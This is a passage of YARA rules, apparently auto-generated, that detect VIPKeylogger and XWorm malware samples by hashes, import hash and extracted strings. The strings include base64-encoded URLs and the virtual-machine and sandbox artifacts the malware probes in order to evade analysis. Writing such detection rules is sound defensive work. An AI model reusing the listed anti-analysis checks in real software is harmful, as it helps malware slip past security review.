      hash1 = "911d8e4c53b4226bb2e1ef12bd7aaf32e88f4f025cf630ad6b02b39261b9dd84"
      hash2 = "deb7e1610fc03728b90b589440b5d042dc4a38c6a55920211602355f44715e2e"
   strings:
      $s1 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s2 = "tempora" fullword wide /* score: '15.00'*/
      $s3 = "quaerat" fullword wide /* score: '13.00'*/
      $s4 = "commodo" fullword wide /* score: '11.00'*/
      $s5 = "deserunt" fullword wide /* score: '11.00'*/
      $s6 = "commodi" fullword wide /* score: '11.00'*/
      $s7 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s8 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s9 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s10 = "consectetur" fullword wide /* score: '8.00'*/
      $s11 = "adipiscing" fullword wide /* score: '8.00'*/
      $s12 = "eiusmod" fullword wide /* score: '8.00'*/
      $s13 = "incididunt" fullword wide /* score: '8.00'*/
      $s14 = "nostrud" fullword wide /* score: '8.00'*/
      $s15 = "exercitation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744__19 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e1d174ef.exe, VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f8591a5b.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8dcb4d42.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f87e613e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d9b561166f1a4217a18c9af81de9dbf9df53a86747993a7c931535761df37f42"
      hash2 = "e1d174ef5c3d4baad0d5a9a9a6dc782fb666bdc311d4b8fb60d31440e6a34153"
      hash3 = "f8591a5b43f62cdd88b1e86812b7360ba8e9b41b2780f8df5f276fd4298f4db8"
      hash4 = "8dcb4d425919ced69671cb2f6aa8e304f34a4dfa2c0c2ec7161bd19dd0ae5b09"
      hash5 = "f87e613ea5b46732940085221e620c503dc7ad6518e390ce448210bebfbe838f"
   strings:
      $s1 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s2 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s3 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s4 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s5 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s6 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s7 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s8 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s9 = "get_GamesPlayed" fullword ascii /* score: '9.00'*/
      $s10 = "GetWordList" fullword ascii /* score: '9.00'*/
      $s11 = "get_isFirstTime" fullword ascii /* score: '9.00'*/
      $s12 = "GetWinPercentage" fullword ascii /* score: '9.00'*/
      $s13 = "get_help_FILL0_wght300_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s14 = "_rectangleLogo" fullword ascii /* score: '9.00'*/
      $s15 = "get_restart_alt_FILL0_wght400_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cf51d_20 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cf51d6c0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c8874e9004498cdb435503b4de3b383b58f47770c159980c452cece14dceaf39"
      hash2 = "cf51d6c002f3888d63d0acc98231e21468f96bb68264f05c2014e3a9e588e6f0"
   strings:
      $s1 = "WinSc32.exe" fullword wide /* score: '22.00'*/
      $s2 = "ezB9OnsxfTp7Mn06ezN9Ons0fQ==" fullword wide /* base64 encoded string  */ /* score: '19.00'*/
      $s3 = "MyProcess" fullword ascii /* score: '15.00'*/
      $s4 = "targetIP" fullword ascii /* score: '14.00'*/
      $s5 = "JVBhc3RlVXJsJQ==" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "aHR0cHM6Ly93aW5kb3dzdXBkYXRlLm1pY3Jvc29mdC5jb20=" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s7 = "aHR0cHM6Ly93aW5hdHAtZ3ctY3VzLm1pY3Jvc29mdC5jb20=" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "aHR0cHM6Ly93YXRzb24ubWljcm9zb2Z0LmNvbQ==" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "aHR0cHM6Ly9tc2VkZ2UuYXBpLmNkcC5taWNyb3NvZnQuY29t" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s10 = "aHR0cHM6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8=" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s11 = "aHR0cHM6Ly9hY3RpdmF0aW9uLnNscy5taWNyb3NvZnQuY29t" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s12 = "WFNYU1hTWA==" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s13 = "PFZpb2xldD4=" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s14 = "VVNCLmV4ZQ==" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s15 = "TW96aWxsYS81LjA=" fullword wide /* base64 encoded string*/ /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _VIPKeylogger_signature__XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__27a028ec_XWorm_signature__f34d5f2d4577ed_21 {
   meta:
      description = "_subset_batch - from files VIPKeylogger(signature).exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_27a028ec.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8cafe02a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f1e1ef23d311c13acde5cf825d3d3857e2fdb688fa97008569ce5fcf37d26d1a"
      hash2 = "27a028ec14e0d0a72a308a7bd7d46722d52bfd988e0776ceb0a60db751af7c3a"
      hash3 = "8cafe02ae7050245022e1afdd9552286c7d3cf944d15cea2d4c7f74fe909e2ec"
   strings:
      $s1 = "targetTimeZoneId" fullword ascii /* score: '14.00'*/
      $s2 = "GetTimeInTimezone" fullword ascii /* score: '9.00'*/
      $s3 = "GetAvailableTimeZones" fullword ascii /* score: '9.00'*/
      $s4 = "GetStopwatchElapsed" fullword ascii /* score: '9.00'*/
      $s5 = "GetActiveStopwatches" fullword ascii /* score: '9.00'*/
      $s6 = "GetActiveCountdownTimers" fullword ascii /* score: '9.00'*/
      $s7 = "GetTimeZoneOffset" fullword ascii /* score: '9.00'*/
      $s8 = "GetTimeZoneDisplayName" fullword ascii /* score: '9.00'*/
      $s9 = "GetCountdownRemaining" fullword ascii /* score: '9.00'*/
      $s10 = "stopwatches" fullword ascii /* score: '8.00'*/
      $s11 = "hazemark" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16504ecd_XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_22 {
   meta:
      description = "_subset_batch - from files XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16504ecd.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6d24740c.exe, XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_da36226d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "16504ecdf01e0666a5a41542568fb228f23d2f65a8fe499c7924f28f4422dc72"
      hash2 = "6d24740c72e3bd6dc0beff4f40f4c1ca658c22eeb9da1f55aa93fba57366d5e5"
      hash3 = "da36226d538cbec62f6c41a859e179109cb1b3f1171eaf5153bb7e7f074784ae"
   strings:
      $x1 = "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys" fullword wide /* score: '32.00'*/
      $x2 = "C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys" fullword wide /* score: '32.00'*/
      $x3 = "C:\\WINDOWS\\system32\\drivers\\vmmouse.sys" fullword wide /* score: '32.00'*/
      $s4 = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0" fullword wide /* score: '18.00'*/
      $s5 = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0" fullword wide /* score: '18.00'*/
      $s6 = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0" fullword wide /* score: '18.00'*/
      $s7 = "\\\\.\\ROOT\\cimv2" fullword wide /* score: '13.00'*/
      $s8 = "VIRTUALBOX" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.50'*/
      $s9 = "C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\" fullword wide /* score: '10.00'*/
      $s10 = "SYSTEM\\ControlSet001\\Services\\Disk\\Enum" fullword wide /* score: '10.00'*/
      $s11 = "wine_get_unix_file_name" fullword wide /* score: '9.00'*/
      $s12 = "VMWARE" fullword wide /* PEStudio Blacklist: strings */ /* score: '8.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

